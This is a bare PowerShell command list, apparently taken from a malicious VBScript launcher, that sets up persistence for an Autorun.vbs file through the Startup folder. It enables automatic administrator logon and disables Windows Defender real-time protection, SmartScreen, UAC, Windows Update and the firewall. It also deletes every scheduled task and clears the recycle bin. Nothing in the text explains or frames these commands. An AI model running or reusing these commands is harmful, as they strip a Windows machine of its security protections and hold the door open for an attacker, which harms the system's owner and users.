powershell.exe Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\*" -Force
powershell.exe $source = "C:\Users\Public\Downloads\Autorun.vbs"
powershell.exe $destination = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Autorun.vbs.lnk"
powershell.exe $WshShell = New-Object -ComObject WScript.Shell
powershell.exe $shortcut = $WshShell.CreateShortcut($destination)
powershell.exe $shortcut.TargetPath = $source
powershell.exe $shortcut.Save()
powershell.exe $ShortcutPath = "C:\Users\Public\Downloads\Startup Folder.lnk"
powershell.exe $TargetPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
powershell.exe $WScriptShell = New-Object -ComObject WScript.Shell
powershell.exe $Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
powershell.exe $Shortcut.TargetPath = $TargetPath
powershell.exe $Shortcut.Save()
powershell.exe $folder = "C:\Users\Public\Downloads\Startup Folder.lnk"
powershell.exe $acl = Get-Acl $folder
powershell.exe $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "Delete", "Deny")
powershell.exe $acl.AddAccessRule($accessRule)
powershell.exe Set-Acl -Path $folder -AclObject $acl
powershell.exe Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "AutoAdminLogon" -Value "1"
powershell.exe New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\PassportForWork" -Force
powershell.exe Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\PassportForWork" -Name "Enabled" -Type DWord -Value 0
powershell.exe set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "AllowDomainPINLogon" -Type DWord -Value 0
powershell.exe Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update\RebootRequired" -Name * -ErrorAction SilentlyContinue
powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true
powershell.exe Stop-Service -Name wuauserv -Force
powershell.exe Set-Service -Name wuauserv -StartupType Disabled
powershell.exe Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name 'ScreenSaveActive' -Value '0'
powershell.exe Set-Service -Name wuauserv -StartupType Disabled
powershell.exe $pause = (Get-Date).AddDays(35)
powershell.exe $pause = $pause.ToUniversalTime().ToString( "2029-07-31T00:00:00Z" )
powershell.exe $pause_start = (Get-Date)
powershell.exe $pause_start = $pause_start.ToUniversalTime().ToString( "yyyy-MM-ddTHH:mm:ssZ" )
powershell.exe Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings' -Name 'PauseUpdatesExpiryTime' -Value $pause                        
powershell.exe Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings' -Name 'PauseFeatureUpdatesStartTime' -Value $pause_start
powershell.exe Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings' -Name 'PauseFeatureUpdatesEndTime' -Value $pause
powershell.exe Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings' -Name 'PauseQualityUpdatesStartTime' -Value $pause_start
powershell.exe Set-itemproperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings' -Name 'PauseQualityUpdatesEndTime' -Value $pause
powershell.exe Set-itemproperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings' -Name 'PauseUpdatesStartTime' -Value $pause_start
powershell.exe New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU' -Force
powershell.exe New-ItemProperty -Path  'HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU' -Name 'NoAutoUpdate' -PropertyType DWORD -Value 1
powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true
powershell.exe Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off"
powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true
powershell.exe Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0
powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true
powershell.exe reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
powershell.exe reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\PasswordLess\Device" /v DevicePasswordLessBuildVersion /t REG_DWORD /d 0 /f
powershell.exe reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoRebootWithLoggedOnUsers /t REG_DWORD /d 1 /f
powershell.exe reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update" /v AUOptions /t REG_DWORD /d 2 /f
powershell.exe reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f
powershell.exe Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1
powershell.exe Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'SubmitSamplesConsent' -Value 2
powershell.exe Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name NoAutoUpdate -Value 1 -Force
powershell.exe Get-ScheduledTask | Where-Object {$_.TaskPath -like "\Microsoft\Windows\WindowsUpdate*"} | ForEach-Object {Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false}
powershell.exe Remove-Item -Path C:\Windows\SoftwareDistribution\Download\* -Recurse -Force
powershell.exe Get-ScheduledTask | Where-Object {$_.TaskName -like "*reboot*" -or $_.TaskName -like "*restart*"} | ForEach-Object {Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false}
powershell.exe Get-ScheduledTask | ForEach-Object {Unregister-ScheduledTask -TaskName $_.TaskName -TaskPath $_.TaskPath -Confirm:$false}
powershell.exe Stop-Service -Name UsoSvc -Force
powershell.exe schtasks /Change /TN "\Microsoft\Windows\UpdateOrchestrator\Reboot" /DISABLE
powershell.exe schtasks /Query /TN "\Microsoft\Windows\UpdateOrchestrator\Reboot"
powershell.exe Clear-RecycleBin -Force
powershell.exe Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False", 0, True
powershell.exe reg add 'HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender' /v DisableAntiSpyware /t REG_DWORD /d 1 /f
powershell.exe reg add 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\PasswordLess\Device' /v DevicePasswordLessBuildVersion /t REG_DWORD /d 0 /f
powershell.exe Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1
powershell.exe Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'SubmitSamplesConsent' -Value 2
powershell.exe exit
